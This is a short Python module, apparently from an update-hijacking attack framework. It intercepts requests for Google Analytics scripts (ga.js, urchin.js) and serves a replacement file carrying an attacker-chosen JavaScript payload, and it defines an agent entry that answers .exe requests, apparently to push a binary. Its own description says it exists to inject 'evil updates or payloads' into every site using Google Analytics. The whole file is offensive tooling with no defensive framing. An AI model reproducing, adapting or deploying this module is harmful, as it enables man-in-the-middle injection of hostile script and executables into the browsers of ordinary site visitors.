from modules import ModuleBase


class GoogleAnalytics(ModuleBase):
    name = 'Google Analytics'
    version = '1.0'
    appver = '< '
    author = ['Francisco Amato < famato +[AT]+ infobytesec.com>']
    description = """This module is used to inject evil updates or payloads in all site with google analytics implementation""",
    vh = '(ssl.google-analytics.com|www.google-analytics.com)'
    options = {
        'payload': {
            'val': 'alert(\'test\');',
            'desc': 'Javascript Payload'
        },
        'rnd1': {
            'val': 'rand_num(5)',
            'hidden': 1,
            'dynamic': 1,
        }
    }    
    requests = [{
            'path': '(/ga.js|/urchin.js)',
            'type': 'file',
            'method': '',
            'bin': 0,
            'string' : "",
            'parse': 1,
            'file': './include/google/ga.js',
        }, {
            'path': '.exe',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': 0,
            'file': ''
        }]